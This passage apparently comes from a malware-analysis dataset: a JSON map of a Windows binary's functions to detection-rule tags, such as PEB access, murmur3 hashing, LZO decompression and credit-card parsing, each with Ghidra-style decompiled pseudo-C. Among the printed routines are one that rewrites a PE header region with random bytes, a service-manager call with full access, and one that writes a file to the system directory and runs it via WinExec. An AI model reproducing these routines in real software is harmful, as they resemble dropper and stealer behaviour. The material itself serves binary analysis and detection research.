0xc) & 1U) == 0;\n    uVar34 = puVar14[2];\n    puVar14[3] = 10;\n    puVar14[2] = 0x407290;\n    puVar14[1] = 10;\n    *puVar14 = 0x407490;\n    puVar14[-1] = 0x4033e4;\n    uVar30 = fcn.00403eb0(*puVar14, puVar14[1], puVar14[2], puVar14[3]);\n    pcVar5 = uVar30 >> 0x20;\n    iVar8 = uVar30;\n    if (bVar25) {\ncode_r0x004033fb:\n        puVar14[-1] = 0xb;\n        puVar14[-2] = 0x40729c;\n        puVar16 = puVar14 + -3;\n        puVar14[-3] = 10;\n    }\n    else {\n        *(puVar14 + -2) = puVar19;\n        puVar22 = puVar19 & 0xffff0000 | *(puVar14 + -2);\n        puVar19 = puVar22;\n        if (!bVar25) goto code_r0x004033fb;\n        puVar19 = puVar22 + 1;\n        out(*puVar22, uVar30 >> 0x20);\n        do {\n            cVar28 = iVar8 >> 8;\n            in_AF = 9 < (iVar8 & 0xf) | in_AF;\n            iVar15 = *puVar14;\n            puVar14 = iVar15 + 4;\n            puVar16 = iVar15 + 4;\n            iVar8 = CONCAT31(CONCAT21(iVar8 >> 0x10, cVar28 - in_AF), -in_AF);\n        } while (in_AF || cVar28 == *pcVar5);\n        piVar13 = uVar34 + pcVar5 * 2;\n        *piVar13 = (*piVar13 + 0x7b) - in_AF;\n        *(extraout_ECX_06 + 0x6a) = iVar8;\n        uVar33 = *(iVar8 + -100) | 0x6ae181d0;\n    }\n    pcVar5[10] = pcVar5[10] + (extraout_ECX_06 >> 8);\n    puVar16[-1] = 0x407490;\n    puVar16[-2] = 0x40340e;\n    fcn.00403eb0(puVar16[-1], *puVar16, puVar16[1], puVar16[2]);\n    puVar16[6] = extraout_EDX_01;\n    *(puVar16 + 0x16) = extraout_CX;\n    *(puVar16 + 5) = uVar34;\n    uVar4 = *(puVar16 + 5);\n    puVar16[6] = 8;\n    puVar16[5] = 0x4072a8;\n    puVar16[4] = 10;\n    puVar16[3] = 0x407490;\n    puVar16[2] = 0x40344a;\n    uVar30 = fcn.00403eb0(puVar16[3], puVar16[4], puVar16[5], puVar16[6]);\n    puVar16[6] = uVar30;\n    puVar16[5] = extraout_ECX_07;\n    puVar16[4] = uVar30 >> 0x20;\n    puVar16[3] = puVar37;\n    puVar16[2] = puVar16 + 7;\n    puVar16[1] = uVar33;\n    *puVar16 = puVar19;\n    puVar16[-1] = uVar34 & 0xffff0000 | uVar4;\n    uVar38 = puVar16[-1];\n    uVar9 = *puVar16;\n    uVar34 = puVar16[3];\n    puVar16[6] = 9;\n    puVar16[5] = 0x4072b0;\n    puVar16[4] = 10;\n    puVar16[3] = 0x407490;\n    puVar16[2] = 0x40346f;\n    Var32 = fcn.00403eb0(puVar16[3], puVar16[4], puVar16[5], puVar16[6]);\n    uVar33 = Var32;\n    *(puVar16 + 0x1a) = uVar34;\n    *(puVar16 + 6) = Var32 >> 0x20;\n    puVar16[5] = uVar33;\n    bVar25 = uVar33 < 0x6e32;\n    bVar26 = uVar33 == 0x6e32;\n    uVar4 = *(puVar16 + 0x1a);\n    puVar16[6] = 9;\n    puVar16[5] = 0x4072bc;\n    puVar16[4] = 10;\n    puVar16[3] = 0x407490;\n    puVar16[2] = 0x4034a7;\n    uVar36 = fcn.00403eb0(puVar16[3], puVar16[4], puVar16[5], puVar16[6]);\n    puVar6 = puVar16 + 3;\n    if ((!bVar25 && !bVar26) && (puVar16[2] = uVar36,  puVar6 = puVar16 + 3,  bVar25 || bVar26)) {\n        uVar9 = puVar16[3];\n        puVar6 = puVar16 + 0xf;\n    }\n    puVar6[-1] = 9;\n    puVar6[-2] = 0x4072c8;\n    puVar6[-3] = 10;\n    puVar6[-4] = 0x407490;\n    puVar6[-5] = 0x4034d1;\n    fcn.00403eb0(puVar6[-4], puVar6[-3], puVar6[-2], puVar6[-1]);\n    puVar6[3] = uVar34 & 0xffff0000 | uVar4;\n    puVar6[2] = extraout_ECX_08;\n    bVar25 = false;\n    bVar26 = ((uVar4 & 0xff00 | uVar4 | extraout_AH) & 0x94f) == 0;\n    iVar10 = puVar6[3];\n    puVar6[3] = 0xc;\n    puVar6[2] = 0x4072d4;\n    puVar6[1] = 10;\n    *puVar6 = 0x407490;\n    puVar6[-1] = 0x4034fd;\n    uVar30 = fcn.00403eb0(*puVar6, puVar6[1], puVar6[2], puVar6[3]);\n    iVar8 = uVar30 >> 0x20;\n    if ((bVar26) || (!bVar26)) {\ncode_r0x00403511:\n        puVar6[-1] = 3;\n        puVar6[-2] = 0x4072e0;\n        puVar6[-3] = 10;\n        puVar6[-4] = 0x407490;\n        puVar6[-5] = 0x403524;\n        uVar36 = fcn.00403eb0(puVar6[-4], puVar6[-3], puVar6[-2], puVar6[-1]);\n        puVar6[3] = uVar36;\n        puVar6[2] = uVar38;\n        puVar6[1] = uVar9;\n        uVar9 = puVar6[1];\n        uVar38 = puVar6[2];\n        puVar6[3] = 10;\n        puVar6[2] = 0x4072e4;\n        puVar6[1] = 10;\n        *puVar6 = 0x407490;\n        puVar6[-1] = 0x403544;\n        uVar33 = fcn.00403eb0(*puVar6, puVar6[1], puVar6[2], puVar6[3]);\n        puVar6[3] = uVar33;\n        uVar12 = POPCOUNT(uVar9 & uVar33 & 0xff);\n        puVar6[3] = 0x40;\n        puVar6[2] = 0x4072f0;\n        puVar17 = puVar6 + 1;\n        puVar6 = puVar6 + 1;\n        *puVar17 = 10;\ncode_r0x0040355b:\n        bVar25 = (uVar12 & 1) == 0;\n        puVar18 = puVar6 + -1;\n        puVar6[-1] = 0x407490;\n        puVar6[-2] = 0x403565;\n        fcn.00403eb0(puVar6[-1], *puVar6, puVar6[1], puVar6[2]);\n        uVar36 = extraout_ECX_09;\n        if (bVar25) {\ncode_r0x00403571:\n            uVar12 = uVar36 >> 8;\n            puVar6[-2] = 0xc;\n            puVar6[-3] = 0x407330;\n            puVar18 = puVar6 + -4;\n            puVar6[-4] = 10;\n        }\n        else {\n            puVar6[-2] = extraout_ECX_09;\n            uVar36 = puVar6[-2];\n            uVar12 = uVar36 >> 8;\n            if (!bVar25) goto code_r0x00403571;\n        }\n        *(extraout_EDX_02 + 0xc) = *(extraout_EDX_02 + 0xc) + -0x68;\n        *(iVar10 + 0x40) = *(iVar10 + 0x40) ^ extraout_EDX_02 >> 8;\n        puVar37 = extraout_EDX_02 + 10;\n        bVar25 = CARRY1(*puVar37, uVar12);\n        *puVar37 = *puVar37 + uVar12;\n        uVar27 = *puVar37 == 0;\n        puVar18[-1] = 0x407490;\n        puVar18[-2] = 0x403584;\n        fcn.00403eb0(puVar18[-1], *puVar18, puVar18[1], puVar18[2]);\n        puVar19 = puVar18 + -1;\n        if ((!bVar25 && !uVar27) && (puVar19 = puVar18 + -1,  bVar25 || uVar27)) {\n            puVar19 = puVar18;\n        }\n        *(puVar19 + -4) = 0xb;\n        *(puVar19 + -8) = 0x40733c;\n        puVar6 = puVar19 + -0xc;\n        *(puVar19 + -0xc) = 10;\n    }\n    else {\n        iVar10 = iVar10 + 1;\n        if (!bVar25 && iVar10 != 0) {\n            in_AF = 9 < (uVar30 & 0xf) | in_AF;\n            piVar13 = (uVar30 & 0xffff0000 | CONCAT11((uVar30 >> 8) + in_AF, uVar30 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar13 = *piVar13 - iVar10;\n            uVar9 = uVar9 + 1;\n            goto code_r0x00403511;\n        }\n        if (!bVar25) {\n            pcVar5 = iVar8 + 10;\n            *pcVar5 = *pcVar5 + extraout_CH_02;\n            uVar12 = POPCOUNT(*pcVar5);\n            goto code_r0x0040355b;\n        }\n        pcVar5 = iVar8 + 10;\n        *pcVar5 = *pcVar5 + extraout_CH_02;\n        uVar27 = *pcVar5 == '\\0';\n    }\n    puVar6[-1] = 0x407490;\n    puVar6[-2] = 0x4035a8;\n    fcn.00403eb0(puVar6[-1], *puVar6, puVar6[1], puVar6[2]);\n    puVar19 = puVar6 + -1;\n    if ((!uVar27) && (puVar19 = puVar6 + -1,  uVar27)) {\n        puVar19 = puVar6 + -3;\n    }\n    puVar19[-1] = 4;\n    puVar19[-2] = 0x407348;\n    puVar19[-3] = 10;\n    puVar19[-4] = 0x407490;\n    puVar19[-5] = 0x4035c4;\n    fcn.00403eb0(puVar19[-4], puVar19[-3], puVar19[-2], puVar19[-1]);\n    puVar19[0xb] = iVar10;\n    iVar8 = puVar19[0xb];\n    puVar19[0xb] = 4;\n    puVar19[10] = 0x40734c;\n    puVar19[9] = 10;\n    puVar19[8] = 0x407490;\n    puVar19[7] = 0x4035ef;\n    uVar36 = fcn.00403eb0(puVar19[8], puVar19[9], puVar19[10], puVar19[0xb]);\n    puVar19[0xb] = uVar36;\n    bVar25 = false;\n    uVar4 = CONCAT11(((uVar36 >> 8) - iVar8) + 'M', uVar36) & 0x26ae;\n    cVar29 = SBORROW2(uVar4, 1);\n    cVar28 = uVar4 - 1 < 0;\n    uVar27 = uVar4 == 1;\n    puVar19[0xb] = 0xc;\n    puVar19[10] = 0x407350;\n    puVar19[9] = 10;\n    puVar19[8] = 0x407490;\n    puVar19[7] = 0x40361d;\n    uVar36 = fcn.00403eb0(puVar19[8], puVar19[9], puVar19[10], puVar19[0xb]);\n    if (!bVar25) {\n        puVar19[7] = uVar9;\n        uVar9 = puVar19[7];\n        if (bVar25) {\n            out(0xbd, uVar36);\n            return;\n        }\n    }\n    puVar19[7] = 4;\n    puVar19[6] = 0x40735c;\n    puVar19[5] = 10;\n    puVar21 = puVar19 + 4;\n    puVar19[4] = 0x407490;\n    puVar19[3] = 0x40364e;\n    uVar33 = fcn.00403eb0(puVar19[4], puVar19[5], puVar19[6], puVar19[7]);\n    if ((!uVar27) && (uVar27)) {\n        iVar8 = iVar8 + 1;\n        if (bVar25 || iVar8 == 0) goto code_r0x004036a7;\n        in_AF = 9 < (uVar33 & 0xf) | in_AF;\n        piVar13 = (uVar33 & 0xffff0000 | CONCAT11((uVar33 >> 8) + in_AF, uVar33 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar13 = *piVar13 - iVar8;\n        cVar29 = SCARRY4(uVar9, 1);\n        cVar28 = uVar9 + 1 < 0;\n    }\n    puVar19[3] = 9;\n    puVar19[2] = 0x407360;\n    puVar19[1] = 10;\n    *puVar19 = 0x407490;\n    puVar19[-1] = 0x403675;\n    uVar30 = fcn.00403eb0(*puVar19, puVar19[1], puVar19[2], puVar19[3]);\n    piVar13 = uVar30 >> 0x20;\n    if ((cVar29 != cVar28) || (cVar29 == cVar28)) {\n        puVar20 = puVar19 + -1;\n        puVar19 = puVar19 + -1;\n        *puVar20 = 0x16;\n    }\n    *(uVar30 + -0x7ce92414) = extraout_ST0_00;\n    *(puVar19 + -4) = iVar8;\n    *piVar13 = *piVar13 + 0x166adf84;\n    *(puVar19 + -8) = 0x40736c;\n    *(puVar19 + -0xc) = 10;\n    *(puVar19 + -0x10) = 0x407490;\n    *(puVar19 + -0x14) = 0x40369d;\n    fcn.00403eb0(*(puVar19 + -0x10), *(puVar19 + -0xc), *(puVar19 + -8), *(puVar19 + -4));\n    *(puVar19 + 0x2c) = iVar8;\n    *(puVar19 + 0x2a) = extraout_DX;\n    puVar21 = puVar19 + 0x28;\n    *(puVar19 + 0x28) = uVar38;\ncode_r0x004036a7:\n    puVar21[1] = 7;\n    *puVar21 = 0x407384;\n    puVar21[-1] = 10;\n    puVar21[-2] = 0x407490;\n    puVar21[-3] = 0x4036c1;\n    fcn.00403eb0(puVar21[-2], puVar21[-1], *puVar21, puVar21[1]);\n    return;\n}\n",
        "token_count": 9763
    },
    "00401930": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00401930(void)\n\n{\n    uchar uVar1;\n    \n    if (*0x424708 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x424708 = 1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00402130": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402296) overlaps instruction at (ram,0x00402294)\n// \n\nuint __cdecl fcn.00402130(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int16_t *piVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int32_t *unaff_EDI;\n    bool bVar9;\n    bool bVar10;\n    uint *var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    bVar9 = CARRY4(*(arg_8h + 0x1e), arg_8h);\n    piVar1 = *(arg_8h + 0x1e) + arg_8h;\n    if ((!bVar9 && piVar1 != NULL) && (bVar9 || piVar1 == NULL)) {\n        piVar1 = unaff_EDI;\n    }\n    if (*piVar1 != 0x4550) {\n        return 0;\n    }\n    iVar2 = piVar1[0x16];\n    if (iVar2 != 0) {\n        return 0;\n    }\n    puVar5 = 0x40;\n    piVar6 = arg_8h;\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        piVar6 = arg_8h + -1;\n        *(unaff_EDI | &stack0xfffffffc) = piVar1;\n    }\n    if (*(piVar6 + 0x1e) < 0x81) {\n        return 0;\n    }\n    if (*(piVar6 + 0x1e) < 0xc0) {\n        puVar5 = *(piVar6 + 0x1e) - 0x80;\n    }\n    var_4h = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar5);\n    if (var_4h == NULL) {\n        return 0;\n    }\n    puVar7 = NULL;\n    bVar9 = false;\n    bVar10 = puVar5 == NULL;\n    uVar3 = extraout_ECX;\n    puVar8 = puVar7;\n    if (!bVar10) {\n        do {\n            iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar3 = 0xff;\n            puVar7 = puVar8 + 1;\n            bVar9 = puVar7 < puVar5;\n            bVar10 = puVar7 == puVar5;\n            *(puVar8 + var_4h) = iVar2 % 0xff;\n            puVar8 = puVar7;\n        } while (bVar9);\n    }\n    if ((bVar9 || bVar10) || (!bVar9 && !bVar10)) {\n        puVar8 = arg_8h + 0x40;\n        uVar4 = puVar5 >> 2;\n        puVar7 = var_4h;\n    }\n    else {\n        uVar4 = uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) - *puVar5, uVar3);\n        *(var_4h + -0x75) = *(var_4h + -0x75) - &var_4h;\n        *(puVar5 + -0x743e7435) = *(puVar5 + -0x743e7435) | uVar3;\n        puVar5 = var_4h;\n        puVar8 = var_4h;\n    }\n    for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = puVar5 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(var_4h);\n    return 1;\n}\n",
        "token_count": 988
    },
    "004023b0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023ed) overlaps instruction at (ram,0x004023e8)\n// \n// WARNING: Removing unreachable block (ram,0x004023e1)\n// WARNING: Removing unreachable block (ram,0x004023e7)\n// WARNING: Removing unreachable block (ram,0x00402430)\n\nbool fcn.004023b0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack272 = 0;\n    puVar3 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    uStack8 = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, auStack12, &uStack272, &uStack8);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&uStack272, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&uStack272);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 400
    },
    "00404de0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404de0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    ushort in_DX;\n    uchar *unaff_ESI;\n    bool in_ZF;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_DX);\n    }\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00404aa0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "00403d00": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d3d) overlaps instruction at (ram,0x00403d3c)\n// \n\nint32_t __cdecl fcn.00403d00(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    int32_t in_EAX;\n    int32_t unaff_EBX;\n    uint16_t *unaff_EDI;\n    bool bVar3;\n    \n    bVar3 = -1 < (in_EAX + unaff_EBX | 0x11a9U);\n    iVar1 = arg_10h;\n    puVar2 = arg_ch;\n    if (((bVar3) && (iVar1 = arg_10h,  puVar2 = arg_ch,  !bVar3)) &&\n       (iVar1 = in_EAX + -0x74efba75,  puVar2 = unaff_EDI,  SCARRY4(in_EAX, -0x74efba75) == in_EAX + -0x74efba75 < 0))\n    goto code_r0x00403d37;\n    while (unaff_EDI = puVar2,  unaff_EBX = iVar1,  unaff_EBX != 0) {\ncode_r0x00403d37:\n        arg_8h = arg_8h + *unaff_EDI;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        puVar2 = unaff_EDI + 1;\n        iVar1 = unaff_EBX + -1;\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 415
    },
    "00401ca0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401ca0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42473c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403a00(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401000(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1869
    },
    "00403330": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040368a) overlaps instruction at (ram,0x00403686)\n// \n// WARNING: Removing unreachable block (ram,0x00403442)\n// WARNING: Removing unreachable block (ram,0x00403484)\n// WARNING: Removing unreachable block (ram,0x00403444)\n\nvoid fcn.00403330(void)\n\n{\n    uint16_t uVar1;\n    char cVar4;\n    uint8_t extraout_AH;\n    uint uVar2;\n    uint32_t uVar3;\n    char extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    int32_t *piVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uint32_t arg_14h;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    uchar uVar10;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    ulong uVar11;\n    uint arg_ch;\n    uint arg_10h;\n    ushort uVar12;\n    uint8_t uVar13;\n    uchar uVar14;\n    uchar uVar15;\n    ushort uVar16;\n    uchar uVar17;\n    uchar uVar18;\n    ushort uVar19;\n    uchar uVar20;\n    int32_t arg_10h_00;\n    uint arg_14h_00;\n    \n    arg_14h_00 = CONCAT31(unaff_ESI, unaff_EDI >> 0x18);\n    arg_10h_00 = unaff_EDI << 8;\n    uVar11 = fcn.00403eb0(0x407490, 10, 0x407010, 0x11);\n    piVar5 = uVar11 >> 0x20;\n    *(uVar11 + -0x7ce92414) = extraout_ST0;\n    in_AF = 9 < (uVar11 - 1U & 0xf) | in_AF;\n    *piVar5 = *piVar5 + 0xf6adf84;\n    arg_10h = 0x40722c;\n    arg_ch = 10;\n    fcn.00403eb0(0x407490, 10, 0x40722c, unaff_EBX);\n    uVar1 = fcn.00403eb0(0x407490, 10, 0x40723c, 0x1a);\n    bVar8 = (POPCOUNT((unaff_EDI & uVar1) + 0xaf70 & 0xc) & 1U) == 0;\n    uVar12 = 0x33e4;\n    uVar11 = fcn.00403eb0(0x407490, 10, 0x407290, 10);\n    pcVar6 = uVar11 >> 0x20;\n    uVar2 = uVar11;\n    if (bVar8) {\ncode_r0x004033fb:\n        uVar12 = 0xb;\n        uVar10 = 0;\n        uVar13 = 0;\n        arg_10h = 0x40729c;\n        arg_ch = 10;\n    }\n    else {\n        uVar10 = unaff_ESI;\n        uVar13 = unaff_ESI >> 8;\n        if (!bVar8) goto code_r0x004033fb;\n        out(*(unaff_ESI & 0xffff0000 | unaff_ESI & 0xff | uVar13 << 8), uVar11 >> 0x20);\n        do {\n            cVar4 = uVar2 >> 8;\n            in_AF = 9 < (uVar2 & 0xf) | in_AF;\n            uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar6);\n        piVar5 = unaff_EDI + pcVar6 * 2;\n        *piVar5 = (*piVar5 + 0x7b) - in_AF;\n        *(extraout_ECX + 0x6a) = uVar2;\n    }\n    pcVar6[10] = pcVar6[10] + (extraout_ECX >> 8);\n    fcn.00403eb0(0x407490, arg_ch, arg_10h, CONCAT13(uVar13, CONCAT12(uVar10, uVar12)));\n    fcn.00403eb0(0x407490, 10, 0x4072a8, 8);\n    fcn.00403eb0(0x407490, 10, 0x4072b0, 9);\n    uVar13 = unaff_EBX >> 8;\n    uVar1 = unaff_EBX & 0xff;\n    arg_14h = unaff_EBX & 0xffff0000 | uVar1 | uVar13 << 8;\n    fcn.00403eb0(0x407490, 10, 0x4072bc, 9);\n    fcn.00403eb0(0x407490, 10, 0x4072c8, 9);\n    bVar8 = false;\n    bVar9 = (CONCAT11(uVar13, uVar1 | extraout_AH) & 0x94f) == 0;\n    uVar18 = 0xd4;\n    uVar19 = 0x4072;\n    uVar20 = 0;\n    uVar15 = 10;\n    uVar16 = 0;\n    uVar17 = 0;\n    uVar10 = 0x90;\n    uVar12 = 0x4074;\n    uVar14 = 0;\n    uVar11 = fcn.00403eb0(0x407490, 10, 0x4072d4, 0xc);\n    iVar7 = uVar11 >> 0x20;\n    if ((bVar9) || (!bVar9)) {\ncode_r0x00403511:\n        fcn.00403eb0(0x407490, 10, 0x4072e0, 3);\n        uVar10 = 0x90;\n        uVar12 = 0x4074;\n        uVar14 = 0;\n        fcn.00403eb0(0x407490, 10, 0x4072e4, 10);\n        uVar18 = 0xf0;\n        uVar19 = 0x4072;\n        uVar20 = 0;\n        uVar15 = 10;\n        uVar16 = 0;\n        uVar17 = 0;\ncode_r0x0040355b:\n        fcn.00403eb0(0x407490, CONCAT13(uVar14, CONCAT21(uVar12, uVar10)), CONCAT13(uVar17, CONCAT21(uVar16, uVar15)), \n                     CONCAT13(uVar20, CONCAT21(uVar19, uVar18)));\n        *(extraout_EDX 